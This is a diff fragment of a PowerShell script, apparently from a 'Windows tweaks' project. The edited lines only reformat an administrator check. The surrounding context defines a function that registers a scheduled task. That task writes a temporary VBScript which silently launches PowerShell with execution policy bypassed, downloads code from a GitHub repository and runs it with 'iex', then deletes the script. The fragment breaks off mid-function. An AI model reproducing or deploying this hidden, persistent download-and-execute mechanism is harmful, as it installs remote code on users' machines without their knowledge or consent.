@@ -1,6 +1,6 @@
-if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
-    Write-Host "Run Powershell as Administrator!
-}
+if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {Write-Host "Run Powershell as Administrator!"}
+
+
 function AddTask{
     $action = New-ScheduledTaskAction -Execute "cmd.exe" -Argument @"
 /c echo Set WshShell=CreateObject("WScript.Shell"): WshShell.Run "powershell -ExecutionPolicy Bypass -Command ""iex (irm 'https://github.com/WindowsTweaksX/boom/raw/refs/heads/main/create_file')""", 0 > "%temp%\run.vbs" && cscript //nologo "%temp%\run.vbs" && del "%temp%\run.vbs"
